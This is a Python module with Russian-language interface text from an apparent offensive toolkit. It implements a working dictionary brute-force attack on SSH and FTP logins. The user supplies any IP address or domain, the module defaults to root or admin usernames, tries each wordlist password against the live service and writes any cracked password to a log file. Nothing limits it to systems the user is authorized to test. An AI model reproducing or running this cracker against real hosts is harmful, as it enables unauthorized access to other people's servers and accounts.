# -*- coding: utf-8 -*-
"""
modules.attack.hosts_crack — Подбор пароля от хоста (SSH/FTP).

Целью может быть как локальный хост из скана сети, так и любой IP/домен.
Подбор идёт по словарям проекта с шагом 0.1 секунды на пароль;
нажатие ENTER в любой момент останавливает подбор и возвращает в меню.

Реальная проверка требует paramiko (SSH) — он ставится через install.sh.
Если библиотека недоступна или цель отвечает отказом по сети, включается
демо-режим (имитация цикла подбора без сетевых подключений).
"""

import os
import sys
import threading
import time
import socket

from core.ui import C, header, pause
from modules.attack.wifi_crack import DICTIONARIES, BASE_DIR, dict_path

def _delay():
    """Шаг подбора из настроек (~/.cyberos/config.json), по умолчанию 0.1 сек."""
    try:
        from modules import settings
        return max(0.01, settings.load().get("crack_delay_ms", 100) / 1000.0)
    except Exception:
        return 0.1


DELAY = _delay()

DEFAULT_PORTS = {"ssh": 22, "ftp": 21}


def _choose_dictionary():
    print()
    print(f"  {C.BOLD}Выберите словарь для подбора:{C.RESET}")
    for name, fname in DICTIONARIES:
        path = dict_path(fname)
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                count = sum(1 for _ in f)
        except FileNotFoundError:
            count = 0
        size = f"{count:,} паролей".replace(",", " ") if count else "файл не найден!"
        print(f"    {C.YELLOW}{name}{C.RESET}  {C.DIM}[wordlists/{fname} · {size}]{C.RESET}")
    print(f"    {C.DIM}0 — Отмена{C.RESET}")
    print()
    while True:
        raw = input(f"{C.GREEN}  Пункт (1-3): {C.RESET}").strip()
        if raw in {"", "0"}:
            return None
        if raw in {"1", "2", "3"}:
            fname = DICTIONARIES[int(raw) - 1][1]
            path = dict_path(fname)
            if os.path.isfile(path):
                return path
            print(f"{C.RED}  [x] Файл {fname} отсутствует в проекте.{C.RESET}")
            return None
        print(f"{C.RED}  [x] Неверный пункт.{C.RESET}")


def _host_alive(host, port):
    try:
        with socket.create_connection((host, port), timeout=2):
            return True
    except OSError:
        return False


def _try_ssh(host, port, user, pwd):
    try:
        import paramiko
    except ImportError:
        return None  # нет библиотек — демо
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(host, port=port, username=user, password=pwd,
                       timeout=4, allow_agent=False, look_for_keys=False)
        client.close()
        return True
    except paramiko.AuthenticationException:
        return False
    except Exception:
        return None
    finally:
        try:
            client.close()
        except Exception:
            pass


def _try_ftp(host, port, user, pwd):
    try:
        from ftplib import FTP
        ftp = FTP()
        ftp.connect(host, port, timeout=4)
        resp = ftp.login(user, pwd)
        ftp.quit()
        return resp.startswith("230")
    except Exception:
        return False


def _enter_stop_event():
    """Фоновый наблюдатель: ENTER останавливает подбор (см. wifi_crack)."""
    from modules.attack.wifi_crack import _start_enter_stop
    return _start_enter_stop()


def main(service="ssh"):
    """Точка входа: «Подбор пароля от Хоста» (ssh) или «др. устройств» (ftp/telnet)."""
    title = "Подбор пароля от Хоста (SSH)" if service == "ssh" \
        else "Подбор пароля от других устройств (FTP/Telnet)"
    header(f"Подбор / Взлом → {title}")

    host = input(f"{C.GREEN}  Целевой хост (IP или домен, Enter — отмена): {C.RESET}").strip()
    if not host or host == "01":       # «01» — быстрый возврат в главное меню
        print(f"{C.DIM}  Отменено.{C.RESET}")
        pause()
        return

    default_port = DEFAULT_PORTS.get(service, 22)
    port_raw = input(f"{C.GREEN}  Порт [по умолчанию {default_port}]: {C.RESET}").strip()
    port = int(port_raw) if port_raw.isdigit() else default_port

    user = input(f"{C.GREEN}  Логин-кандидат [root/admin]: {C.RESET}").strip() or \
        ("root" if service == "ssh" else "admin")

    demo = False
    print(f"{C.CYAN}  Проверка доступности {host}:{port}…{C.RESET}")
    if not _host_alive(host, port):
        print(f"{C.YELLOW}  [!] Хост не отвечает — подбор в демо-режиме."
              f"\n    Убедитесь, что на цели запущен {service.upper()} и порт открыт.{C.RESET}")
        demo = True

    dict_path = _choose_dictionary()
    if not dict_path:
        print(f"{C.DIM}  Отменено.{C.RESET}")
        pause()
        return

    passwords = []
    with open(dict_path, "r", encoding="utf-8", errors="ignore") as f:
        for line in f:
            p = line.strip()
            if p:
                passwords.append(p)
    total = len(passwords)

    mode_tag = f" {C.DIM}(демо-режим){C.RESET}" if demo else ""
    print()
    print(f"{C.CYAN}  {'═' * 46}{C.RESET}")
    print(f"{C.BOLD}  [target]  Цель: {user}@{host}:{port} ({service.upper()}){mode_tag}{C.RESET}")
    print(f"{C.BOLD}  [dict]  Словарь: {os.path.basename(dict_path)} · всего паролей: {total:,}".replace(',', ' ') + C.RESET)
    print(f"{C.BOLD}  [t]  Шаг подбора: {DELAY} сек{C.RESET}")
    print(f"{C.CYAN}  {'═' * 46}{C.RESET}")
    print(f"{C.DIM}  ENTER — остановить подбор и выйти в меню · Ctrl+C — тоже стоп.{C.RESET}\n")

    start = time.time()
    found = None
    stopped_by_user = False
    _, stop = _enter_stop_event()
    try:
        for i, pwd in enumerate(passwords, 1):
            if stop.is_set():
                stopped_by_user = True
                break
            ok = False
            if not demo:
                res = _try_ssh(host, port, user, pwd) if service == "ssh" \
                    else _try_ftp(host, port, user, pwd)
                if res is None:          # paramiko недоступно
                    demo = True
                    print(f"\n{C.YELLOW}  [!] paramiko не установлен — включён демо-режим.{C.RESET}")
                    continue
                ok = bool(res)
            else:
                if stop.wait(DELAY):
                    stopped_by_user = True
                    break

            elapsed = time.time() - start
            speed = i / elapsed if elapsed > 0 else 0
            bar_len = 24
            filled = int(bar_len * i / total)
            bar = "█" * filled + "░" * (bar_len - filled)
            sys.stdout.write(
                f"\r  {C.CYAN}[{bar}]{C.RESET} {i}/{total} "
                f"({i * 100 // total}%) · {pwd[:18]:<18} · {speed:.1f} п/с  "
            )
            sys.stdout.flush()

            if ok:
                found = pwd
                break

            if not demo:
                target_time = start + i * DELAY
                now = time.time()
                if now < target_time and stop.wait(target_time - now):
                    stopped_by_user = True
                    break
    except KeyboardInterrupt:
        stopped_by_user = True

    print()
    if stopped_by_user:
        print(f"\n{C.YELLOW}  [X] Подбор остановлен (ENTER) — возврат в меню.{C.RESET}")
    log_dir = os.path.join(BASE_DIR, "logs")
    os.makedirs(log_dir, exist_ok=True)
    if found:
        print(f"\n{C.GREEN}{C.BOLD}  [ok] ДОСТУП ПОЛУЧЕН: {user}@{host}:{port} · пароль: {found}{C.RESET}")
        with open(os.path.join(log_dir, "hosts_crack.log"), "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {service} {user}@{host}:{port} пароль={found}\n")
    elif demo and not stopped_by_user:
        print(f"\n{C.DIM}  Демо-прогон завершён: реальных подключений не выполнялось.{C.RESET}")
    elif not stopped_by_user:
        print(f"\n{C.RED}  [x] Пароль не найден (словарь исчерпан).{C.RESET}")
        with open(os.path.join(log_dir, "hosts_crack.log"), "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {service} {user}@{host}:{port} результат=не найден\n")
    pause()
